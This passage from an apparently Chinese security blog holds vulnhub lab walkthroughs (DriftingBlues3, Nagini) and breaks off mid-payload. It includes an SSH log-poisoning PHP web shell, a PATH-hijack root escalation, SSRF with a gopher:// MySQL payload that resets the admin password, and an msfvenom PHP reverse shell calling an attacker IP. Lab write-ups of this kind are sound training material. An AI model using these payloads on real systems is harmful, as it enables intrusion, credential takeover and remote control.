class="line">80/tcp open  http    Apache httpd 2.4.38 ((Debian))</span><br><span class="line">| http-robots.txt: 1 disallowed entry </span><br><span class="line">|_/eventadmins</span><br><span class="line">|_http-server-header: Apache/2.4.38 (Debian)</span><br><span class="line">|_http-title: Site doesn't have a title (text/html).</span><br><span class="line">MAC Address: 08:00:27:E3:42:41 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 13.95 seconds</span><br></pre></td></tr></table></figure>

<ul>
<li>目录扫描</li>
</ul>
<p><img data-src="./driftingblues3/1.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://192.168.43.149/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">┌──(root💀weiyi)-[/home/weiyi]</span><br><span class="line">└─# gobuster dir -u http://192.168.43.149/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.1.0</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://192.168.43.149/</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.1.0</span><br><span class="line">[+] Extensions:              html,txt,php</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">2021/05/22 12:23:02 Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/index.html           (Status: 200) [Size: 1373]</span><br><span class="line">/privacy              (Status: 301) [Size: 318] [--&gt; http://192.168.43.149/privacy/]</span><br><span class="line">/robots.txt           (Status: 200) [Size: 37]                                      </span><br><span class="line">/tickets.html         (Status: 200) [Size: 347]                                     </span><br><span class="line">/drupal               (Status: 301) [Size: 317] [--&gt; http://192.168.43.149/drupal/] </span><br><span class="line">/secret               (Status: 301) [Size: 317] [--&gt; http://192.168.43.149/secret/] </span><br><span class="line">/Makefile             (Status: 200) [Size: 11]                                      </span><br><span class="line">/wp-admin             (Status: 301) [Size: 319] [--&gt; http://192.168.43.149/wp-admin/]</span><br><span class="line">/phpmyadmin           (Status: 301) [Size: 321] [--&gt; http://192.168.43.149/phpmyadmin/]</span><br><span class="line">/server-status        (Status: 403) [Size: 279]                                        </span><br><span class="line">                                                                                       </span><br><span class="line">===============================================================</span><br><span class="line">2021/05/22 12:25:54 Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>

<h3 id="登录web"><a href="#登录web" class="headerlink" title="登录web"></a>登录web</h3><ul>
<li>首页</li>
</ul>
<p><img data-src="./driftingblues3/2.png" alt></p>
<ul>
<li>访问<code>robots.txt</code></li>
</ul>
<p><img data-src="./driftingblues3/3.png" alt></p>
<ul>
<li>继续访问<a href="http://192.168.43.149/eventadmins/" target="_blank" rel="noopener">http://192.168.43.149/eventadmins/</a></li>
</ul>
<p><img data-src="./driftingblues3/4.png" alt></p>
<ul>
<li>继续访问</li>
</ul>
<p><img data-src="./driftingblues3/5.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(root💀weiyi)-[/home/weiyi]</span><br><span class="line">└─# echo "aW50cnVkZXI/IEwyRmtiV2x1YzJacGVHbDBMbkJvY0E9PQ==" | base64 -d</span><br><span class="line">intruder? L2FkbWluc2ZpeGl0LnBocA==                                                                                                                                                                                                                     </span><br><span class="line">┌──(root💀weiyi)-[/home/weiyi]</span><br><span class="line">└─# echo "L2FkbWluc2ZpeGl0LnBocA==" | base64 -d                        </span><br><span class="line">/adminsfixit.php</span><br></pre></td></tr></table></figure>

<ul>
<li>访问<code>/adminsfixit.php</code></li>
</ul>
<p><img data-src="./driftingblues3/6.png" alt></p>
<h3 id="SSH日志投毒"><a href="#SSH日志投毒" class="headerlink" title="SSH日志投毒"></a>SSH日志投毒</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh '&lt;?php system($_GET['c']); ?&gt;'@192.168.43.149</span><br></pre></td></tr></table></figure>

<p><img data-src="./driftingblues3/7.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> or</span></span><br><span class="line">ssh -i id_rsa '&lt;?php system($_GET['c']); ?&gt;'@192.168.43.149</span><br></pre></td></tr></table></figure>

<ul>
<li>投毒成功</li>
</ul>
<p><img data-src="./driftingblues3/8.png" alt></p>
<h3 id="WebShell"><a href="#WebShell" class="headerlink" title="WebShell"></a>WebShell</h3><p><img data-src="./driftingblues3/9.png" alt></p>
<ul>
<li><code>ssh</code>目录可写</li>
</ul>
<p><img data-src="./driftingblues3/10.png" alt></p>
<ul>
<li>写入公钥</li>
</ul>
<p><img data-src="./driftingblues3/11.png" alt></p>
<ul>
<li>成功登录<code>robertj</code></li>
</ul>
<p><img data-src="./driftingblues3/12.png" alt></p>
<p><img data-src="./driftingblues3/13.png" alt></p>
<h3 id="提权-amp-amp-Flag"><a href="#提权-amp-amp-Flag" class="headerlink" title="提权&amp;&amp;Flag"></a>提权&amp;&amp;Flag</h3><ul>
<li><code>suid</code>发现</li>
</ul>
<p><img data-src="./driftingblues3/14.png" alt></p>
<ul>
<li>执行</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">robertj@driftingblues:/tmp$ /usr/bin/getinfo</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">##################</span></span></span><br><span class="line">ip address</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">##################</span></span></span><br><span class="line"></span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 ::1/128 scope host </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">2: enp0s3: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 1000</span><br><span class="line">    link/ether 08:00:27:e3:42:41 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 192.168.43.149/24 brd 192.168.43.255 scope global dynamic enp0s3</span><br><span class="line">       valid_lft 911sec preferred_lft 911sec</span><br><span class="line">    inet6 240e:47d:30d1:140e:a00:27ff:fee3:4241/64 scope global dynamic mngtmpaddr </span><br><span class="line">       valid_lft 3374sec preferred_lft 3374sec</span><br><span class="line">    inet6 240e:47c:30a0:2d06:a00:27ff:fee3:4241/64 scope global dynamic mngtmpaddr </span><br><span class="line">       valid_lft 912sec preferred_lft 912sec</span><br><span class="line">    inet6 fe80::a00:27ff:fee3:4241/64 scope link </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">##################</span></span></span><br><span class="line">hosts</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">##################</span></span></span><br><span class="line"></span><br><span class="line">127.0.0.1	localhost</span><br><span class="line">127.0.1.1	driftingblues</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> The following lines are desirable <span class="keyword">for</span> IPv6 capable hosts</span></span><br><span class="line">::1     localhost ip6-localhost ip6-loopback</span><br><span class="line">ff02::1 ip6-allnodes</span><br><span class="line">ff02::2 ip6-allrouters</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">##################</span></span></span><br><span class="line">os info</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">##################</span></span></span><br><span class="line"></span><br><span class="line">Linux driftingblues 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64 GNU/Linux</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &quot;&#x2F;bin&#x2F;bash&quot; &gt;&gt; &#x2F;tmp&#x2F;cat</span><br><span class="line">chmod 777 &#x2F;tmp&#x2F;cat</span><br><span class="line">export PATH&#x3D;&#x2F;tmp:$PATH</span><br><span class="line">cd &#x2F;tmp</span><br><span class="line"># 拿到root shell</span><br></pre></td></tr></table></figure>

<p><img data-src="./driftingblues3/15.png" alt></p>
<p><img data-src="./driftingblues3/16.png" alt></p>
]]></content>
      <categories>
        <category>靶场</category>
        <category>driftingblues</category>
      </categories>
      <tags>
        <tag>入门</tag>
        <tag>综合靶场测试</tag>
      </tags>
  </entry>
  <entry>
    <title>Nagini</title>
    <url>/2022/02/20/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/Nagini/</url>
    <content><![CDATA[<h1 id="Nagini"><a href="#Nagini" class="headerlink" title="Nagini"></a>Nagini</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    一道boot2root的综合靶场练习</p>
<a id="more"></a>

<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><ul>
<li>kali2021</li>
<li>Nagini</li>
<li>windows10</li>
</ul>
<h2 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h2><h3 id="发现目标"><a href="#发现目标" class="headerlink" title="发现目标"></a>发现目标</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">┌──(root💀weiyi)-[/home/weiyi/vulnhub/Nagini]</span><br><span class="line">└─# arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:e1:47:5f, IPv4: 192.168.43.189</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.43.1	26:ca:cd:37:40:d8	(Unknown: locally administered)</span><br><span class="line">192.168.43.165	08:00:27:0e:31:37	PCS Systemtechnik GmbH</span><br><span class="line">192.168.43.188	d0:c6:37:be:7e:b3	Intel Corporate</span><br><span class="line"></span><br><span class="line">3 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 1.955 seconds (130.95 hosts/sec). 3 responded</span><br></pre></td></tr></table></figure>

<ul>
<li>目标为 <code>192.168.1.101</code></li>
<li><code>NMAP</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sC -sV -p- 192.168.1.101</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">┌──(root💀weiyi)-[/home/weiyi/vulnhub/Nagini]</span><br><span class="line">└─# nmap -sC -sV -p- 192.168.43.165</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-11 08:42 EDT</span><br><span class="line">Nmap scan report for 192.168.43.165</span><br><span class="line">Host is up (0.00042s latency).</span><br><span class="line">Not shown: 65533 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 48:df:48:37:25:94:c4:74:6b:2c:62:73:bf:b4:9f:a9 (RSA)</span><br><span class="line">|   256 1e:34:18:17:5e:17:95:8f:70:2f:80:a6:d5:b4:17:3e (ECDSA)</span><br><span class="line">|_  256 3e:79:5f:55:55:3b:12:75:96:b4:3e:e3:83:7a:54:94 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.38 ((Debian))</span><br><span class="line">|_http-server-header: Apache/2.4.38 (Debian)</span><br><span class="line">|_http-title: Site doesn't have a title (text/html).</span><br><span class="line">MAC Address: 08:00:27:0E:31:37 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 8.68 seconds</span><br></pre></td></tr></table></figure>

<ul>
<li>目录扫描</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://192.168.1.101/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">┌──(root💀weiyi)-[/home/weiyi/vulnhub/Nagini]</span><br><span class="line">└─# gobuster dir -u http://192.168.43.165/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.1.0</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://192.168.43.165/</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.1.0</span><br><span class="line">[+] Extensions:              html,txt,php</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">2021/05/11 08:43:03 Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/index.html           (Status: 200) [Size: 97]</span><br><span class="line">/note.txt             (Status: 200) [Size: 234]</span><br><span class="line">/joomla               (Status: 301) [Size: 317] [--&gt; http://192.168.43.165/joomla/]</span><br><span class="line">/server-status        (Status: 403) [Size: 279]                                    </span><br><span class="line">                                                                                   </span><br><span class="line">===============================================================</span><br><span class="line">2021/05/11 08:46:38 Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>

<h3 id="登录web"><a href="#登录web" class="headerlink" title="登录web"></a>登录web</h3><ul>
<li>首页</li>
</ul>
<p><img data-src="./Nagini/1.png" alt></p>
<ul>
<li>查看<code>note.txt</code>提示如下</li>
</ul>
<p><img data-src="./Nagini/2.png" alt></p>
<h3 id="搭建http3-server-quic服务器"><a href="#搭建http3-server-quic服务器" class="headerlink" title="搭建http3 server quic服务器"></a>搭建http3 server quic服务器</h3><ul>
<li>github地址: <a href="https://github.com/cloudflare/quiche" target="_blank" rel="noopener">https://github.com/cloudflare/quiche</a></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone --recursive https://github.com/cloudflare/quiche</span><br><span class="line">cargo build --examples</span><br></pre></td></tr></table></figure>

<ul>
<li>需要先安装rust</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh</span><br><span class="line"><span class="meta">#</span><span class="bash"> 或者直接 apt 安装</span></span><br></pre></td></tr></table></figure>

<p>报错</p>
<p><img data-src="./Nagini/3.png" alt></p>
<p>安装cmake</p>
<p><img data-src="./Nagini/4.png" alt></p>
<p>ok！</p>
<ul>
<li>启动客户端服务</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd quiche/target/debug/examples</span><br><span class="line">./http3-client https://192.168.1.101</span><br></pre></td></tr></table></figure>

<p><img data-src="./Nagini/5.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1. We no longer require functionality at /internalResourceFeTcher.php in our main production servers.So I will be removing the same by this week.</span><br><span class="line"></span><br><span class="line">2. All developers are requested not to put any configuration's backup file (.bak) in main production servers as they are readable by every one.</span><br></pre></td></tr></table></figure>

<ul>
<li>发现ssrf</li>
</ul>
<p><img data-src="./Nagini/6.png" alt></p>
<h3 id="joomscan"><a href="#joomscan" class="headerlink" title="joomscan"></a>joomscan</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[+] FireWall Detector</span><br><span class="line">[++] Firewall not detected</span><br><span class="line"></span><br><span class="line">[+] Detecting Joomla Version</span><br><span class="line">[++] Joomla 3.9.25</span><br><span class="line"></span><br><span class="line">[+] Core Joomla Vulnerability</span><br><span class="line">[++] Target Joomla core is not vulnerable</span><br><span class="line"></span><br><span class="line">[+] Checking Directory Listing</span><br><span class="line">[++] directory has directory listing : </span><br><span class="line">http://192.168.1.101/joomla/administrator/components</span><br><span class="line">http://192.168.1.101/joomla/administrator/modules</span><br><span class="line">http://192.168.1.101/joomla/administrator/templates</span><br><span class="line">http://192.168.1.101/joomla/tmp</span><br><span class="line">http://192.168.1.101/joomla/images/banners</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] Checking apache info/status files</span><br><span class="line">[++] Readable info/status files are not found</span><br><span class="line"></span><br><span class="line">[+] admin finder</span><br><span class="line">[++] Admin page : http://192.168.1.101/joomla/administrator/</span><br><span class="line"></span><br><span class="line">[+] Checking robots.txt existing</span><br><span class="line">[++] robots.txt is found</span><br><span class="line">path : http://192.168.1.101/joomla/robots.txt </span><br><span class="line"></span><br><span class="line">Interesting path found from robots.txt</span><br><span class="line">http://192.168.1.101/joomla/joomla/administrator/</span><br><span class="line">http://192.168.1.101/joomla/administrator/</span><br><span class="line">http://192.168.1.101/joomla/bin/</span><br><span class="line">http://192.168.1.101/joomla/cache/</span><br><span class="line">http://192.168.1.101/joomla/cli/                                                                                                                                                       </span><br><span class="line">http://192.168.1.101/joomla/components/                                                                                                                                                </span><br><span class="line">http://192.168.1.101/joomla/includes/                                                                                                                                                  </span><br><span class="line">http://192.168.1.101/joomla/installation/                                                                                                                                              </span><br><span class="line">http://192.168.1.101/joomla/language/                                                                                                                                                  </span><br><span class="line">http://192.168.1.101/joomla/layouts/                                                                                                                                                   </span><br><span class="line">http://192.168.1.101/joomla/libraries/                                                                                                                                                 </span><br><span class="line">http://192.168.1.101/joomla/logs/                                                                                                                                                      </span><br><span class="line">http://192.168.1.101/joomla/modules/                                                                                                                                                   </span><br><span class="line">http://192.168.1.101/joomla/plugins/                                                                                                                                                   </span><br><span class="line">http://192.168.1.101/joomla/tmp/                                                                                                 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] Finding common backup files name                                                                                                                                                   </span><br><span class="line">[++] Backup files are not found                                                                                                                                                      </span><br><span class="line">[+] Finding common log files name                                                                                                                                                      </span><br><span class="line">[++] error log is not found                                                                                                                                                                                                                                                                                           </span><br><span class="line">[+] Checking sensitive config.php.x file                                                                                                                                               </span><br><span class="line">[++] Readable config file is found                                                                                                                                                     </span><br><span class="line"> config file path : http://192.168.1.101/joomla/configuration.php.bak                                                                                                                 </span><br><span class="line">Your Report : reports/192.168.1.101/</span><br></pre></td></tr></table></figure>

<ul>
<li>用ssrf获取备份文件信息</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">JConfig</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $offline = <span class="string">'0'</span>;</span><br><span class="line">	<span class="keyword">public</span> $offline_message = <span class="string">'This site is down for maintenance.&lt;br /&gt;Please check back again soon.'</span>;</span><br><span class="line">	<span class="keyword">public</span> $display_offline_message = <span class="string">'1'</span>;</span><br><span class="line">	<span class="keyword">public</span> $offline_image = <span class="string">''</span>;</span><br><span class="line">	<span class="keyword">public</span> $sitename = <span class="string">'Joomla CMS'</span>;</span><br><span class="line">	<span class="keyword">public</span> $editor = <span class="string">'tinymce'</span>;</span><br><span class="line">	<span class="keyword">public</span> $captcha = <span class="string">'0'</span>;</span><br><span class="line">	<span class="keyword">public</span> $list_limit = <span class="string">'20'</span>;</span><br><span class="line">	<span class="keyword">public</span> $access = <span class="string">'1'</span>;</span><br><span class="line">	<span class="keyword">public</span> $debug = <span class="string">'0'</span>;</span><br><span class="line">	<span class="keyword">public</span> $debug_lang = <span class="string">'0'</span>;</span><br><span class="line">	<span class="keyword">public</span> $debug_lang_const = <span class="string">'1'</span>;</span><br><span class="line">	<span class="keyword">public</span> $dbtype = <span class="string">'mysqli'</span>;</span><br><span class="line">	<span class="keyword">public</span> $host = <span class="string">'localhost'</span>;</span><br><span class="line">	<span class="keyword">public</span> $user = <span class="string">'goblin'</span>;</span><br><span class="line">	<span class="keyword">public</span> $password = <span class="string">''</span>;</span><br><span class="line">	<span class="keyword">public</span> $db = <span class="string">'joomla'</span>;</span><br><span class="line">	<span class="keyword">public</span> $dbprefix = <span class="string">'joomla_'</span>;</span><br><span class="line">	<span class="keyword">public</span> $live_site = <span class="string">''</span>;</span><br><span class="line">	<span class="keyword">public</span> $secret = <span class="string">'ILhwP6HTYKcN7qMh'</span>;</span><br><span class="line">	<span class="keyword">public</span> $gzip = <span class="string">'0'</span>;</span><br><span class="line">	<span class="keyword">public</span> $error_reporting = <span class="string">'default'</span>;</span><br><span class="line">	<span class="keyword">public</span> $helpurl = <span class="string">'https://help.joomla.org/proxy?keyref=Help&#123;major&#125;&#123;minor&#125;:&#123;keyref&#125;&amp;lang=&#123;langcode&#125;'</span>;</span><br><span class="line">	<span class="keyword">public</span> $ftp_host = <span class="string">''</span>;</span><br><span class="line">	<span class="keyword">public</span> $ftp_port = <span class="string">''</span>;</span><br><span class="line">	<span class="keyword">public</span> $ftp_user = <span class="string">''</span>;</span><br><span class="line">	<span class="keyword">public</span> $ftp_pass = <span class="string">''</span>;</span><br><span class="line">	<span class="keyword">public</span> $ftp_root = <span class="string">''</span>;</span><br><span class="line">	<span class="keyword">public</span> $ftp_enable = <span class="string">'0'</span>;</span><br><span class="line">	<span class="keyword">public</span> $offset = <span class="string">'UTC'</span>;</span><br><span class="line">	<span class="keyword">public</span> $mailonline = <span class="string">'1'</span>;</span><br><span class="line">	<span class="keyword">public</span> $mailer = <span class="string">'mail'</span>;</span><br><span class="line">	<span class="keyword">public</span> $mailfrom = <span class="string">'site_admin@nagini.hogwarts'</span>;</span><br><span class="line">	<span class="keyword">public</span> $fromname = <span class="string">'Joomla CMS'</span>;</span><br><span class="line">	<span class="keyword">public</span> $sendmail = <span class="string">'/usr/sbin/sendmail'</span>;</span><br><span class="line">	<span class="keyword">public</span> $smtpauth = <span class="string">'0'</span>;</span><br><span class="line">	<span class="keyword">public</span> $smtpuser = <span class="string">''</span>;</span><br><span class="line">	<span class="keyword">public</span> $smtppass = <span class="string">''</span>;</span><br><span class="line">	<span class="keyword">public</span> $smtphost = <span class="string">'localhost'</span>;</span><br><span class="line">	<span class="keyword">public</span> $smtpsecure = <span class="string">'none'</span>;</span><br><span class="line">	<span class="keyword">public</span> $smtpport = <span class="string">'25'</span>;</span><br><span class="line">	<span class="keyword">public</span> $caching = <span class="string">'0'</span>;</span><br><span class="line">	<span class="keyword">public</span> $cache_handler = <span class="string">'file'</span>;</span><br><span class="line">	<span class="keyword">public</span> $cachetime = <span class="string">'15'</span>;</span><br><span class="line">	<span class="keyword">public</span> $cache_platformprefix = <span class="string">'0'</span>;</span><br><span class="line">	<span class="keyword">public</span> $MetaDesc = <span class="string">''</span>;</span><br><span class="line">	<span class="keyword">public</span> $MetaKeys = <span class="string">''</span>;</span><br><span class="line">	<span class="keyword">public</span> $MetaTitle = <span class="string">'1'</span>;</span><br><span class="line">	<span class="keyword">public</span> $MetaAuthor = <span class="string">'1'</span>;</span><br><span class="line">	<span class="keyword">public</span> $MetaVersion = <span class="string">'0'</span>;</span><br><span class="line">	<span class="keyword">public</span> $robots = <span class="string">''</span>;</span><br><span class="line">	<span class="keyword">public</span> $sef = <span class="string">'1'</span>;</span><br><span class="line">	<span class="keyword">public</span> $sef_rewrite = <span class="string">'0'</span>;</span><br><span class="line">	<span class="keyword">public</span> $sef_suffix = <span class="string">'0'</span>;</span><br><span class="line">	<span class="keyword">public</span> $unicodeslugs = <span class="string">'0'</span>;</span><br><span class="line">	<span class="keyword">public</span> $feed_limit = <span class="string">'10'</span>;</span><br><span class="line">	<span class="keyword">public</span> $feed_email = <span class="string">'none'</span>;</span><br><span class="line">	<span class="keyword">public</span> $log_path = <span class="string">'/var/www/html/joomla/administrator/logs'</span>;</span><br><span class="line">	<span class="keyword">public</span> $tmp_path = <span class="string">'/var/www/html/joomla/tmp'</span>;</span><br><span class="line">	<span class="keyword">public</span> $lifetime = <span class="string">'15'</span>;</span><br><span class="line">	<span class="keyword">public</span> $session_handler = <span class="string">'database'</span>;</span><br><span class="line">	<span class="keyword">public</span> $shared_session = <span class="string">'0'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 比较敏感的信息如下</span></span><br><span class="line">public $user = 'goblin';</span><br><span class="line">public $password = '';</span><br><span class="line">public $db = 'joomla';</span><br></pre></td></tr></table></figure>


<ul>
<li>利用ssrf+gopher 执行mysql命令，github地址:<a href="https://github.com/tarunkant/Gopherus" target="_blank" rel="noopener">https://github.com/tarunkant/Gopherus</a></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chmod +x install.sh</span><br><span class="line">sudo ./install.sh</span><br><span class="line"></span><br><span class="line">gopherus --exploit mysql</span><br></pre></td></tr></table></figure>

<p><img data-src="./Nagini/7.png" alt></p>
<ul>
<li>最后拿到密码的操作</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">use joomla; select password from joomla_users where email='site_admin@nagini.hogwarts';</span><br><span class="line"><span class="meta">#</span><span class="bash"> 将密码修改为 123456</span></span><br><span class="line">use joomla; update joomla_users set password='e10adc3949ba59abbe56e057f20f883e' where email='site_admin@nagini.hogwarts';</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">gopher://127.0.0.1:3306/_%a5%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%67%6f%62%6c%69%6e%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%7a%00%00%00%03%75%73%65%20%6a%6f%6f%6d%6c%61%3b%20%75%70%64%61%74%65%20%6a%6f%6f%6d%6c%61%5f%75%73%65%72%73%20%73%65%74%20%70%61%73%73%77%6f%72%64%3d%27%65%31%30%61%64%63%33%39%34%39%62%61%35%39%61%62%62%65%35%36%65%30%35%37%66%32%30%66%38%38%33%65%27%20%77%68%65%72%65%20%65%6d%61%69%6c%3d%27%73%69%74%65%5f%61%64%6d%69%6e%40%6e%61%67%69%6e%69%2e%68%6f%67%77%61%72%74%73%27%3b%01%00%00%00%01</span><br></pre></td></tr></table></figure>

<h3 id="登录joomla后台"><a href="#登录joomla后台" class="headerlink" title="登录joomla后台"></a>登录joomla后台</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">site_admin / 123456</span><br></pre></td></tr></table></figure>

<ul>
<li>拿到webshell</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 生成 msf php 马</span></span><br><span class="line">msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.82 LPORT=4444 -f raw</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">C:\root\vulnhub\Nagini\Gopherus&gt; msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.82 LPORT=4444 -f raw</span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload</span><br><span class="line">[-] No arch selected, selecting arch: php from the payload</span><br><span class="line">No encoder specified, outputting raw payload</span><br><span class="line">Payload size: 1113 bytes</span><br><span class="line">/*&lt;?php /**/ error_reporting(0); $ip = '192.168.1.82'; $port = 4444; if (($f = 'stream_socket_client') &amp;&amp; is_callable($f)) &#123; $s = $f("tcp://&#123;$ip&#125;:&#123;$port&#125;"); $s_type = 'stream'; &#125; if (!$s &amp;&amp; ($f = 'fsockopen') &amp;&amp; is_callable($f)) &#123; $s = $f($ip, $port); $s_type = 'stream'; &#125; if (!$s &amp;&amp; ($f = 'socket_create') &amp;&amp; is_callable($f)) &#123; $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) &#123; die(); &#125; $s_type = 'socket'; &#125; if (!$s_type) &#123; die('no socket funcs'); &#125; if (!$s) &#123; die('no socket'); &#125; switch ($s_type) &#123; case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; &#125; if (!$len) &#123; die(); &#125; $a = unpack("Nlen", $len); $len = $a['len']; $b = ''; while (strlen($b) &lt; $len) 